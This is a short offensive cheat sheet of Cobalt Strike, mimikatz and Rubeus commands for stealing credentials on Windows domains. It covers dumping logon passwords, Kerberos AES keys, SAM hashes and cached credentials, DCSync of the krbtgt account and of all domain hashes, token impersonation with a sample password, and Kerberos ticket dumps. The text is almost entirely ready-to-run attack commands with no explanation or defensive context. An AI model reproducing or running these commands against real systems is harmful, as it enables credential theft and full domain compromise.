### Cobalt Strike
```
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::ekeys
mimikatz !lsadump::sam
mimikatz !lsadump::cache

make_token marvel\administrator P@ssw0rd
mimikatz @lsadump::dcsync /user:marvel\krbtgt
mimikatz @lsadump::dcsync /domain:marvel.local /all /csv
rev2self
```

### NTLM RC4 Hash Dump
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > res1.txt
type .\res1.txt | sls 'username|password|ntlm'
```

### Kerberos AES256 Hash Dump
```
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit > res2.txt
type .\res2.txt | sls 'username|password|des_cbc_md4'
```

### Local Users Hash Dump (SAM)
```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit > res3.txt
type .\res3.txt | sls "user :|hash|aes256"
```
### Domain Cached Credentials
```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit
```

### Kerberos Tickets Dump
```
execute-assembly /root/Rubeus.exe triage
execute-assembly /root/Rubeus.exe dump /nowrap > res4.txt
execute-assembly /root/Rubeus.exe dump /nowrap /luid:0x70331 /service:krbtgt
```
